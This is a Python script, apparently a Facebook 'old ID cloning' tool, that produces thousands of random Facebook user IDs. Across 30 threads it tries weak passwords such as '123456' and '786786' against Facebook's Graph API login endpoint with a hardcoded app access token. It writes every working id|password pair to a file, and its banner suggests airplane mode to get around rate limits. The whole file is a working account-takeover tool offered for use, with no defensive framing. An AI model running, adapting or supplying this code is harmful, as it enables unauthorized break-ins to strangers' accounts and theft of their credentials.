import os, sys, time, uuid, random, string, requests
from concurrent.futures import ThreadPoolExecutor as tred

# --- Modules Auto Install ---
try:
    import requests
except ImportError:
    os.system('pip install requests')
try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install beautifulsoup4')

# --- Colors ---
G = '\x1b[38;5;46m' # Green
W = '\x1b[1;37m'    # White
R = '\x1b[38;5;196m'# Red
Y = '\x1b[38;5;220m'# Yellow

# --- Variables ---
loop = 0
oks = []
user = []

# --- My Channel Link ---
# Yahan apna channel link paste karein
channel_link = "https://whatsapp.com/channel/ApnaLinkYahanDalo" 

def banner():
    os.system('clear')
    print(f"""{G}
       ░█████╗░████████╗████████╗░█████╗░
       ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗
       ███████║░░░██║░░░░░░██║░░░███████║
       ██╔══██║░░░██║░░░░░░██║░░░██╔══██║
       ██║░░██║░░░██║░░░░░░██║░░░██║░░██║
       ╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝
       {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
       {R}[{W}√{R}] {G}DEVELOPER : 𝐀𝐓𝐓𝐀 𝐏𝐀𝐓𝐇𝐀𝐍
       {R}[{W}√{R}] {G}STATUS    : OLD CLONING (FREE)
       {R}[{W}√{R}] {G}CHANNEL   : FOLLOW FOR UPDATES
       {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def linex():
    print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def main():
    banner()
    print(f'       {R}({W}1{R}){G} OLD ID CLONING (2009-2014)')
    print(f'       {R}({W}2{R}){G} FOLLOW MY CHANNEL')
    print(f'       {R}({W}0{R}){G} EXIT TOOL')
    linex()
    choice = input(f'       {R}[{W}?{R}] {G}SELECT : {Y}')
    if choice in ['1', '01']:
        cloning_menu()
    elif choice in ['2', '02']:
        os.system(f'xdg-open {channel_link}')
        main()
    else:
        sys.exit()

def cloning_menu():
    banner()
    print(f'       {R}[{W}√{R}] {G}CLONING LIMITS: 5000, 10000, 50000')
    try:
        limit = int(input(f'       {R}[{W}?{R}] {G}ENTER LIMIT : {Y}'))
    except:
        limit = 5000
    
    linex()
    print(f'       {R}({W}A{R}){G} METHOD 1 (Old Series)')
    print(f'       {R}({W}B{R}){G} METHOD 2 (New Series)')
    linex()
    meth = input(f'       {R}[{W}?{R}] {G}CHOICE : {Y}').upper()
    
    for _ in range(limit):
        uid = "10000" + "".join(random.choices(string.digits, k=10))
        user.append(uid)
        
    with tred(max_workers=30) as pool:
        banner()
        print(f'       {R}[{W}√{R}] {G}TOTAL IDS : {W}{len(user)}')
        print(f'       {R}[{W}√{R}] {G}PROCESS STARTED... {R}(Use Airplane Mode)')
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_method, uid, ['123456', '1234567', '12345678', '123456789'])
            else:
                pool.submit(login_method, uid, ['123123', '786786', '556677', 'firstlast'])

def login_method(uid, pwall):
    global loop, oks
    sys.stdout.write(f'\r\r{R}[{G}𝐀𝐓𝐓𝐀-𝐏𝐀𝐓𝐇𝐀𝐍{R}] {G}{loop}{R}|{G}OK:{len(oks)}')
    sys.stdout.flush()
    
    for pw in pwall:
        try:
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            session = requests.Session()
            data = {
                "email": uid,
                "password": pw,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "method": "auth.login",
                "format": "json"
            }
            headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com"
            }
            response = session.post("https://graph.facebook.com/auth/login", data=data, headers=headers).json()
            
            if "session_key" in response:
                print(f'\r\r{G}[𝐀𝐓𝐓𝐀-OK] {uid} | {pw}')
                open('/sdcard/ATTA-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print(f'\r\r{G}[𝐀𝐓𝐓𝐀-OK] {uid} | {pw}') # Considering CP as OK in old cloning
                open('/sdcard/ATTA-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(uid)
                break
        except:
            pass
    loop += 1

if __name__ == "__main__":
    main()
